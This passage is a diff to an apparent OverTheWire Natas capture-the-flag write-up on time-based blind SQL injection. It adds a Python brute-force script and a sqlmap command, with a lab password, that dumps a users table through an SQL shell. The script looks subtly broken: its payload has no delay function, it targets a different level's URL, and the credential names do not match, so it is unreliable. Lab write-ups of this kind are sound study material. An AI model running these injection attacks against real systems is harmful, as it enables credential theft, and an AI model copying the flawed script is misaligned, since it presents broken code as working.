@@ -143,4 +143,41 @@ for i in range(0,32):
 
 This level is similar to the previous level but there is no feedback as to whether the user exists or not. Hence we need to use Time-Based Blind SQLi to derive the password.
 
+Initially we decide to go with a python script and pen this:
+
+```
+import requests
+
+from requests.auth import HTTPBasicAuth
+
+chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+filtered = ''
+max_time_taken = 0
+max_character = ""
+passwd = ""
+
+for j in range(32):
+    for char in chars:
+        Data = {'username': 'natas18" and password={}; #'.format(
+            passwd + char)}
+        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php',
+                          auth=HTTPBasicAuth('natas16', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'), data=Data)
+        t = r.elapsed.total_seconds()
+        if t > max_time_taken:
+            max_time_taken = t
+            max_character = char
+    passwd += max_character
+    print(passwd)
+```
+
+But the script was too slow so we switch to [sqlmap](https://sqlmap.org/). This will be faster as the website's source code provides us several SQL parameters such as the database server type (MySQL), database name, table name etc.
+
+```
+sqlmap --url "http://natas17.natas.labs.overthewire.org/index.php" --auth-type Basic --auth-cred "natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd" --data="username=natas18" --risk 3 --level 5 --dbms mysql -vv --batch --sql-shell
+```
+
+Followed by the SQL query: `SELECT password FROM users;` and a lot (at least half an hour) of waiting gets us four records (passwords), the last of which works successfully.
+
+For some unknown reason `SELECT password FROM users WHERE username=natas18;` failed to work.
+
 #### End of writeup
